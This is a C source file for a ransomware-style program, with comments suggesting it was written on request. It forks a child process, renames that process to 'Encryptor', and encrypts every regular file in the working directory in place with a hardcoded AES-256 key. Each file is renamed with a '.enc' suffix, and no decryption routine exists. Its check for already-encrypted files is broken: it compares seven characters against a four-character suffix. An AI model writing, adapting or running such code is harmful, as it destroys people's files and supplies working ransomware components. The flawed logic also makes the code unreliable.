#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/prctl.h> // Required for process renaming

#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16
#define MAX_FILENAME_LEN 256

unsigned char key[AES_KEY_SIZE] = {0x2d, 0xd6, 0x15, 0x89, 0xf5, 0xdd, 0x73, 0xe2, 0x30, 0x89, 0xb0, 0xb2, 0xac, 0x0a, 0xf4, 0x24, 0x9c, 0x48, 0xc9, 0x61, 0x5e, 0xe9, 0xbb, 0x08, 0x2f, 0x58, 0x0e, 0x7a, 0xec, 0xf9, 0xf7, 0xf1};

void handleErrors(void)
{
    abort();
}

int aes_encrypt_file(const char *filename)
{
    FILE *file = NULL;
    EVP_CIPHER_CTX *ctx = NULL;
    unsigned char iv[AES_IV_SIZE];

    int status = -1;
    long file_len;
    unsigned char *plaintext = NULL;
    unsigned char *ciphertext = NULL;
    int len;
    int ciphertext_len = 0;
    int final_len = 0;

    if (RAND_bytes(iv, AES_IV_SIZE) != 1) {
        return -1;
    }

    file = fopen(filename, "rb");
    if (!file) {
        goto cleanup;
    }

    fseek(file, 0, SEEK_END);
    file_len = ftell(file);
    fseek(file, 0, SEEK_SET);

    plaintext = (unsigned char *)malloc(file_len);
    if (!plaintext) {
        goto cleanup;
    }
    if (fread(plaintext, 1, file_len, file) != file_len) {
        goto cleanup;
    }

    ciphertext = (unsigned char *)malloc(file_len + AES_IV_SIZE);
    if (!ciphertext) {
        goto cleanup;
    }
    
    if (!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, file_len))
        handleErrors();
    ciphertext_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &final_len))
        handleErrors();
    ciphertext_len += final_len;
    
    fclose(file);
    file = NULL;

    file = fopen(filename, "wb");
    if (!file) {
        goto cleanup;
    }

    if (fwrite(ciphertext, 1, ciphertext_len, file) != ciphertext_len) {
        goto cleanup;
    }

    if (fwrite(iv, 1, AES_IV_SIZE, file) != AES_IV_SIZE) {
        goto cleanup;
    }

    status = 0;

cleanup:
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    if (file) fclose(file);
    if (plaintext) free(plaintext);
    if (ciphertext) free(ciphertext);
    return status;
}

int main(int argc, char *argv[])
{
    if (argc != 1) {
        return 1;
    }

    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    
    const char *executable_path = argv[0];
    const char *exe_base_name = strrchr(executable_path, '/');
    if (exe_base_name) {
        exe_base_name++;
    } else {
        exe_base_name = executable_path;
    }
    
    int overall_result = 0;
    pid_t pid = fork(); // Fork only once

    if (pid < 0) {
        return 1; // Fork failed
    } else if (pid > 0) {
        // PARENT PROCESS: Wait for the single child to complete. Self-deletion is disabled.
        int status;
        waitpid(pid, &status, 0); 
        int child_result = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
        
        // Handle OpenSSL cleanup in the parent process too
        EVP_cleanup();
        ERR_free_strings();

        // Self-deletion logic removed as requested.
        
        return child_result;
    }

    // CHILD PROCESS EXECUTION (pid == 0): Encrypt all files
    
    const char *process_name = "Encryptor"; 

    // Method 1: Use prctl(PR_SET_NAME). This sets the 'comm' field, but may be restricted.
    prctl(PR_SET_NAME, process_name, 0, 0, 0);

    // Method 2: Manually rewrite argv[0]. This is an attempt to set the 'cmd' field 
    // by overwriting the memory where the original executable path was stored.
    size_t new_name_len = strlen(process_name);
    size_t old_name_len = strlen(argv[0]);
    
    if (new_name_len <= old_name_len) {
        // Copy the new name
        strncpy(argv[0], process_name, old_name_len);
        // Null-terminate the rest of the original space to clean up the command line view
        for (size_t i = new_name_len; i < old_name_len; i++) {
            argv[0][i] = '\0';
        }
    }
    
    DIR *dir = opendir(".");
    if (dir == NULL) {
        exit(1);
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        const char *in_file = entry->d_name;
        char new_file[MAX_FILENAME_LEN];
        int result;
        size_t in_file_len = strlen(in_file);

        if (strcmp(in_file, ".") == 0 || strcmp(in_file, "..") == 0) {
            continue;
        }

        // CRITICAL: Skip the executable file itself
        if (strcmp(in_file, exe_base_name) == 0) {
             continue;
        }

        if (in_file_len > 7 && strcmp(in_file + in_file_len - 7, ".enc") == 0) {
            continue;
        }
        
        struct stat st;
        if (stat(in_file, &st) != 0 || !S_ISREG(st.st_mode)) {
             continue;
        }

        if (snprintf(new_file, sizeof(new_file), "%s.enc", in_file) >= sizeof(new_file)) {
            if (overall_result == 0) overall_result = 2; // Filename too long
            continue;
        }

        result = aes_encrypt_file(in_file);
        
        if (result == 0) {
            if (rename(in_file, new_file) != 0) {
                if (overall_result == 0) overall_result = 2; // Rename failed
            }
        } else {
            if (overall_result == 0) overall_result = 1; // Encryption failed
        }
    }
    
    if (dir) closedir(dir);

    // Final cleanup for the child process
    EVP_cleanup();
    ERR_free_strings();
    
    // Sleep for 10 seconds before exiting as requested
    sleep(10);

    // The child exits, its status is captured by the waiting parent
    exit(overall_result);
}